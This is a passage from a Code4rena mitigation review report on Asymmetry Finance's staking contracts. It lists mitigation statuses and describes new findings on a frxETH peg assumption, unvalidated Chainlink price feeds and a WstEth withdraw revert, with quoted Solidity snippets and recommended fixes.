href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/593\">H-05</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/33\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/28\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/6\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588\">H-06</a></td>\n<td>Not fully mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40\">adriro</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13\">0x52</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/210\">H-07</a></td>\n<td>Sub-optimally mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/56\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/41\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/11\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/142\">H-08</a></td>\n<td>Mitigation confirmed with comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/35\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/29\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/12\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078\">M-01</a></td>\n<td>Not fully mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/59\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/77\">adriro</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049\">M-02</a></td>\n<td>Not mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/63\">d3e4</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/15\">0x52</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016\">M-03</a></td>\n<td>Sponsor chose not to mitigate</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/932\">M-04</a></td>\n<td>Not mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/36\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/45\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/16\">0x52</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812\">M-05</a></td>\n<td>Not mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/64\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/17\">0x52</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/770\">M-06</a></td>\n<td>Sponsor acknowledged</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765\">M-07</a></td>\n<td>Sponsor acknowledged</td>\n<td>Report from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/50\">adriro</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/685\">M-08</a></td>\n<td>Not mitigated</td>\n<td>Report from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/51\">adriro</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/673\">M-09</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/37\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/19\">0x52</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/363\">M-10</a></td>\n<td>Incorrectly mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/54\">adriro</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/38\">d3e4</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/152\">M-11</a></td>\n<td>Partially mitigated</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/55\">adriro</a> - details also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/150\">M-12</a></td>\n<td>Incorrectly mitigated</td>\n<td>Reports from d3e4 (<a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/67\">here</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/66\">here</a>) and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/57\">adriro</a> - details also shared below</td>\n</tr>\n</tbody>\n</table>\n<p><strong>The wardens surfaced several new findings and mitigation errors. These consisted of 1 High severity issue &#x26; 6 Medium severity issues. See below for details regarding these as well as issues that were not fully mitigated.</strong></p>\n<h2 id=\"high-protocol-assumes-a-11-peg-of-frxeth-to-eth\" style=\"position:relative;\"><a href=\"#high-protocol-assumes-a-11-peg-of-frxeth-to-eth\" aria-label=\"high protocol assumes a 11 peg of frxeth to eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/58\">[High] Protocol assumes a 1:1 peg of frxETH to ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/58\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/9\">0x52</a></em></p>\n<p><strong>Severity: High</strong></p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/pull/262/files</code></p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>ethPerDerivative()</code> function in the SfrxEth now assumes a peg of frxETH to ETH, and reverts if the price difference (queried through the Curve pool) is more than 0.1%. Presumably, this decision was likely caused by the fact that frxETH doesn’t have a Chainlink price feed, so the sponsor decided to continue using the Curve oracle but now assuming there is a peg between both tokens.</p>\n<p>This assumption is very dangerous and could potentially cause a DoS in the derivative if frxETH de-pegs as the <code>ethPerDerivative()</code> function will always revert.</p>\n<p>Similarly to the scenarios described in this issue <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/588</a> for stETH, it may be the case that a sell pressure on frxETH tanks the price down, or a buy pressure raises the prices above the expected limit (see charts here <a href=\"https://www.coingecko.com/en/coins/frax-ether/eth\">https://www.coingecko.com/en/coins/frax-ether/eth</a>). Especially with just a margin of 0.1%, as this represents a difference of just 0.001 ETH per unit.</p>\n<p>It could also be the case that the protocol behind frxETH fails or gets compromised. If this happens then it is highly likely the price will fall as people will start exiting their position. As the SfrxEth <code>withdraw()</code> functions depends on the <code>ethPerDerivative()</code> function to calculate slippage, this will effectively DoS users that want to exit their position using <code>unstake()</code>, and will also DoS protocol admins that need to call <code>rebalanceToWeights()</code> to remove the position on the protocol level.</p>\n<h3 id=\"recommendation-6\" style=\"position:relative;\"><a href=\"#recommendation-6\" aria-label=\"recommendation 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Remove the 1:1 peg assumption. Regarding the price manipulation, remember that the Curve oracle price represents a moving average of the price. Alternatively, look for another TWAP price feed or introduce additional checks to guard against price manipulation attacks (see <a href=\"https://code4rena.com/reports/2022-02-redacted-cartel#m-17-thecosomataeth-oracle-price-can-be-better-secured-freshness--tamper-resistance\">https://code4rena.com/reports/2022-02-redacted-cartel#m-17-thecosomataeth-oracle-price-can-be-better-secured-freshness—tamper-resistance</a>).</p>\n<hr>\n<h2 id=\"medium-chainlink-price-feed-responses-are-not-validated\" style=\"position:relative;\"><a href=\"#medium-chainlink-price-feed-responses-are-not-validated\" aria-label=\"medium chainlink price feed responses are not validated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/60\">[Medium] Chainlink price feed responses are not validated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/60\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/73\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/8\">0x52</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<ul>\n<li><code>https://github.com/asymmetryfinance/smart-contracts/pull/209/files</code></li>\n<li><code>https://github.com/asymmetryfinance/smart-contracts/pull/242/files</code></li>\n</ul>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The protocol team introduced Chainlink price feeds for the Reth and WstEth derivatives in order to mitigate price manipulation attacks.</p>\n<p>These changes introduce new issues, as the Chainlink responses are not validated at all. This is the implementation for Reth:</p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/pull/209/files#diff-6abc8f2e4ad1647a12784e9fbf18e9c5f86c05668e3e89e2a51ab569992b214fR146-L216</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"161\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chainLinkRethEthPrice</span><span class=\"mtk1\">, , , ) = </span><span class=\"mtk12\">chainLinkRethEthFeed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">latestRoundData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">chainLinkRethEthPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In the case of the WstEth derivative, additionally, the implementation even sets the price to zero if it is negative:</p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/pull/242/files#diff-ac281bf63004ef9a825c084018c54f10b03233cd4f286398f5d5e993612308b5R90-R98</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"162\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stPerWst</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getStETHByWstETH</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chainLinkStEthEthPrice</span><span class=\"mtk1\">, , , ) = </span><span class=\"mtk12\">chainLinkStEthEthFeed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">latestRoundData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">chainLinkStEthEthPrice</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">chainLinkStEthEthPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethPerWstEth</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stPerWst</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">chainLinkStEthEthPrice</span><span class=\"mtk1\">)) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethPerWstEth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Chainlink responses must be validated. The price may be invalid, the current round may not be finished, the response may be stale, among other issues. These outputs represent critical pieces in the protocol, as <code>ethPerDerivative()</code> is used in the <code>stake()</code> function to calculate the deposited amount, and also used to calculate slippage in the implementation of the derivative.</p>\n<p>As a reference, these reports mention similar cases of missing validation in the Chainlink response:</p>\n<ul>\n<li><a href=\"https://github.com/sherlock-audit/2022-09-knox-judging/issues/137\">https://github.com/sherlock-audit/2022-09-knox-judging/issues/137</a></li>\n<li><a href=\"https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94\">https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94</a></li>\n<li><a href=\"https://solodit.xyz/issues/9795\">https://solodit.xyz/issues/9795</a></li>\n</ul>\n<p>The following report also mentions an important detail related to the freshness of the feed for stETH/ETH, as the heartbeat for this oracle is 24 hours, see <a href=\"https://github.com/sherlock-audit/2023-03-olympus-judging/issues/2\">https://github.com/sherlock-audit/2023-03-olympus-judging/issues/2</a> . Note that also the rETH/ETH price feed has a 2% deviation threshold, see <a href=\"https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth\">https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth</a>.</p>\n<ul>\n<li><a href=\"https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth\">https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth</a></li>\n<li><a href=\"https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth\">https://data.chain.link/ethereum/mainnet/crypto-eth/reth-eth</a></li>\n</ul>\n<h3 id=\"recommendation-7\" style=\"position:relative;\"><a href=\"#recommendation-7\" aria-label=\"recommendation 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Validate the Chainlink response arguments. See the following article for a good set of recommendations <a href=\"https://0xmacro.com/blog/how-to-consume-chainlink-price-feeds-safely/\">https://0xmacro.com/blog/how-to-consume-chainlink-price-feeds-safely/</a>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/60#issuecomment-1539101501\">toshiSat (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>👍 </p>\n</blockquote>\n<hr>\n<h2 id=\"medium-reappearance-of-m-02-in-wstethwithdraw\" style=\"position:relative;\"><a href=\"#medium-reappearance-of-m-02-in-wstethwithdraw\" aria-label=\"medium reappearance of m 02 in wstethwithdraw permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70\">[Medium] Reappearance of M-02 in <code>WstEth.withdraw()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70\">d3e4</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/69\">d3e4</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/derivatives/WstEth.sol#L71-L72</code></p>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>The changes in <code>WstEth.withdraw()</code>(<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/derivatives/WstEth.sol#L69C33-L84</code>) has introduced a new issue exactly parallel to the one present in <code>SfrxEth.withdraw()</code> which was reported in <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049\">M-02: sFrxEth may revert on redeeming non-zero amount</a>, i.e. <code>WstEth.withdraw(_amount)</code> may revert when <code>_amount > 0</code>. For why this is an issue please refer to M-02. The mitigation of M-02 was to enable/disable derivatives. See my mitigation review of M-02 for how that issue is not resolved and why I think the mitigation may be insufficient. What is said there equally apply, mutatis mutandis, to this new issue.</p>\n<h3 id=\"proof-of-concept-31\" style=\"position:relative;\"><a href=\"#proof-of-concept-31\" aria-label=\"proof of concept 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>WstEth.withdraw()</code> now begins</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"163\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stEthAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IWStETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WST_ETH</span><span class=\"mtk1\">).</span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stEthAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;No stETH to unwrap&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>We therefore have the same problem as in M-02 if <code>IWStETH(WST_ETH).unwrap(1) == 0</code>.\n<a href=\"https://github.com/lidofinance/lido-dao/blob/df95e563445821988baf9869fde64d86c36be55f/contracts/0.6.12/WstETH.sol#L69-L75\"><code>WstEth.unwrap()</code></a> is</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"164\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">unwrap</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wstETHAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wstETHAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;wstETH: zero amount unwrap not allowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stETHAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPooledEthByShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wstETHAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wstETHAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 